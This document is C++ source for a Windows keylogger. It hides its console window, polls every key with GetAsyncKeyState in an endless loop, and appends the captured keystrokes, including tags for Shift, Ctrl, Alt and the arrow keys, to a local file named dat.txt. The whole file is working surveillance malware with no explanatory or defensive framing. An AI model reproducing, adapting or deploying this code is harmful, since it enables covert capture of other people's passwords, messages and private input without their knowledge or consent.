#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

using namespace std;

void Log(string input);
void Log(char input);
bool is_SpecialKey(int key);


int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	while (1) {
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767)
			{
				if (!is_SpecialKey(KEY))
				{
					Log(char(KEY));
					cout << char(KEY);
					
				}
			}
		}
	}

	return 0;
}
void Log(string input) {
	fstream LogFile;
	LogFile.open("dat.txt", fstream::app);
	if (LogFile.is_open())
	{
		LogFile << input;
		LogFile.close();
	}
}
void Log(char input) {
	fstream LogFile;
	LogFile.open("dat.txt", fstream::app);
	if (LogFile.is_open())
	{
		LogFile << input;
		LogFile.close();
	}
}
bool is_SpecialKey(int key) {
	switch (key) {
	case VK_SPACE:
		Log(" ");
		return true;
	case VK_RETURN:
		Log("\n");
		return true;
	case '¾':
		Log(".");
		return true;
	case VK_SHIFT:
		Log("#SHIFT#");
		return true;
	case VK_BACK:
		Log("\b");
		return true;
	case VK_RBUTTON:
		Log("#R_CLICK#");
		return true;
	case VK_CAPITAL:
		Log("#CAPS_LCOK");
		return true;
	case VK_TAB:
		Log("#TAB");
		return true;
	case VK_UP:
		Log("#UP_ARROW_KEY");
		return true;
	case VK_DOWN:
		Log("#DOWN_ARROW_KEY");
		return true;
	case VK_LEFT:
		Log("#LEFT_ARROW_KEY");
		return true;
	case VK_RIGHT:
		Log("#RIGHT_ARROW_KEY");
		return true;
	case VK_CONTROL:
		Log("#CONTROL");
		return true;
	case VK_MENU:
		Log("#ALT");
		return true;
	default:
		return false;
	}
}